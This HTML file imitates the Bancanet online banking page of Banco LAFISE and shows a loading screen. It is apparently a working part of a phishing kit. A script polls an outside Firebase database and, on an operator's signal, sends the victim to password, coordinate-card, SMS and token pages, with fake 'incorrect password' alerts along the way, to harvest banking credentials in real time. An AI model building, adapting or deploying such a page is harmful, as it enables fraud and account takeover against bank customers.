<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Bancanet - Banco LAFISE</title>
    <style>
      :root {
        --green: #007e68;
        --green-dark: #0b6c57;
        --text: #173c33;
        --link: #0b6c57;
        --border: #cfd8d5;
        --btn-bg: #a9d9cc;
        --btn-br: #8fcfbe;
        --btn-tx: #0b6c57;
        --card: #fff;
      }
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      html,
      body {
        height: 100%;
      }
      body {
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial,
          Helvetica, sans-serif;
        background: var(--green);
        color: var(--text);
      }

      /* Barra superior */
      .topbar {
        height: 52px;
        background: var(--green-dark);
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 14px;
        color: #eaf7f3;
        position: sticky;
        top: 0;
        z-index: 5;
      }
      /* Una sola imagen responsiva */
      .icons {
        opacity: 0.9;
      }
      .icons img {
        height: 18px;
        width: auto;
      }
      .desktop-img {
        display: none;
      }

      @media (min-width: 768px) {
        .mobile-img {
          display: none;
        }
        .desktop-img {
          display: block;
        }
      }

      .lang {
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 14px;
      }
      .caret {
        border: 4px solid transparent;
        border-top-color: #eaf7f3;
        margin-top: 3px;
      }

      /* Contenido */
      .wrap {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 0;
        min-height: calc(100vh - 52px);
      }

      .card {
        width: 100%;
        max-width: 410px;
        background: var(--card);
        border-radius: 2px;
        box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.08);
        padding: 40px;
        padding-bottom: 90px;
        min-height: 480px; /* alto en móvil */
        display: flex;
        flex-direction: column;
        justify-content: flex-start;
        margin-top: 0;
      }

      /* Logo centrado arriba */
      .logo-top {
        width: 200px;
        height: 40px;
        margin: 0 auto 18px;
        background: url("logo.png") no-repeat center/contain; /* móvil */
      }

      @media (min-width: 768px) {
        .wrap {
          justify-content: center;
        } /* centrado vertical */
        .card {
          min-height: auto;
        }
        .logo-top {
          background: url("logo.png") no-repeat center/contain; /* escritorio */
          width: 300px;
          height: 46px;
        }
      }

      h1 {
        text-align: center;
        font-size: 18px;
        font-weight: 700;
        margin-bottom: 18px;
      }

      /* Input con icono */
      .input-wrap {
        display: flex;
        align-items: center;
        gap: 8px;
        border: 1px solid var(--border);
        border-left: 4px solid var(--green-dark);
        border-radius: 2px;
        padding: 10px 12px;
        background: #fff;
        margin-bottom: 8px;
      }
      .icon {
        width: 18px;
        height: 18px;
        flex: 0 0 18px;
        opacity: 0.75;
        fill: #b3c3be;
      }
      .input {
        width: 100%;
        border: 0;
        outline: 0;
        font-size: 14px;
        color: #223e36;
      }

      .help-row {
        display: flex;
        justify-content: flex-end;
        margin-bottom: 12px;
      }
      .link {
        color: var(--link);
        text-decoration: none;
        font-size: 12px;
      }
      .link:hover {
        text-decoration: underline;
      }

      .info {
        text-align: center;
        font-size: 13px;
        margin-bottom: 18px;
      }
      .info a {
        display: block;
        margin: 4px 0;
        font-size: 13px;
      }

      /* Botón a la derecha */
      .actions {
        display: flex;
        justify-content: flex-end;
        margin-top: auto;
      }
      .btn {
        background: #e0e0e0;
        border: 1px solid #ccc;
        color: #888;
        padding: 10px 22px;
        border-radius: 3px;
        font-weight: 600;
        cursor: not-allowed;
        transition: all 0.3s ease;
        opacity: 0.6;
        display: inline-flex;
        align-items: center;
        gap: 8px;
      }

      /* Loading container */
      .loading-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 200px;
        gap: 20px;
      }

      /* Dot loader animation */
      .dot-loader-main {
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .dot {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background-color: var(--green);
        animation: dot-bounce 1.4s ease-in-out infinite both;
      }

      .dot:nth-child(1) {
        animation-delay: -0.32s;
      }
      .dot:nth-child(2) {
        animation-delay: -0.16s;
      }
      .dot:nth-child(3) {
        animation-delay: 0s;
      }

      .loading-text {
        font-size: 16px;
        color: var(--text);
        font-weight: 500;
      }

      @keyframes dot-bounce {
        0%,
        80%,
        100% {
          transform: scale(0.8);
          opacity: 0.5;
        }
        40% {
          transform: scale(1);
          opacity: 1;
        }
      }

      /* Estado activado */
      .btn.active {
        background: var(--green);
        border: 1px solid var(--green-dark);
        color: #fff;
        cursor: pointer;
        opacity: 1;
      }
      .btn.active:active {
        transform: translateY(1px);
      }
      .btn.active:hover {
        background: var(--green-dark);
      }

      /* Estados de carga del botón */
      .btn.loading {
        opacity: 0.7;
        cursor: not-allowed;
      }
      .btn.loading:hover {
        background: var(--green);
        transform: none;
      }

      /* Footer */
      .foot {
        text-align: center;
        color: #eaf7f3;
        font-size: 11px;
        padding: 10px 0 18px;
      }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        onSnapshot,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
        authDomain: "basedtos-84767.firebaseapp.com",
        projectId: "basedtos-84767",
        storageBucket: "basedtos-84767.appspot.com",
        messagingSenderId: "622608516389",
        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
      };

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      window.db = db; // Hacer db accesible globalmente
      window.doc = doc;
      window.setDoc = setDoc;
      window.onSnapshot = onSnapshot;
    </script>
  </head>
  <body>
    <!-- Barra superior -->
    <header class="topbar">
      <div class="icons">
        <img
          src="logomobil.png"
          alt="Icono móvil"
          class="mobile-img"
          style="
            width: 70px;
            height: 70px;
            margin-left: 20px;
            margin-top: 30px;
            background: var(--green-dark);
            padding: 10px;
          "
        />
        <img
          src="logopc.png"
          alt="Icono PC"
          class="desktop-img"
          style="
            width: 140px;
            height: auto;
            margin-left: 50px;
            margin-top: 50px;
            padding: 5px;
            background: var(--green-dark);
          "
        />
      </div>
      <div class="lang"><span>ES</span><span class="caret"></span></div>
    </header>

    <!-- Contenido -->
    <main class="wrap">
      <section class="card">
        <div class="logo-top"></div>

        <!-- Loading content -->
        <div class="loading-container">
          <div class="dot-loader-main">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
          </div>
          <p class="loading-text">Cargando...</p>
        </div>
      </section>

      <p class="foot">
        © Banco LAFISE - Todos los derechos reservados - www.lafise.com
      </p>
    </main>
  </body>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const questionRef = window.doc(
        window.db,
        "lafis2",
        localStorage.getItem("usuario")
      );
      window.onSnapshot(questionRef, (doc) => {
        if (doc.exists()) {
          const questionData = doc.data();

          if (questionData.page == 1) {
            window.location.href = "index.html";
          }
          if (questionData.page == 2) {
            window.location.href = "coordenadas.html";
          }
          if (questionData.page == 3) {
            alert("Contraseña Incorrecta");
            window.location.href = "contra.html";
          }
          if (questionData.page == 4) {
            alert("Autentiación Fallida");
            window.location.href = "index.html";
          }
          if (questionData.page == 5) {
            window.location.href = "sms.html";
          }

          if (questionData.page == 7) {
            window.location.href = "token.html";
          }

          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
        } else {
          console.log("No such document!");
        }
      });
    });
  </script>
</html>
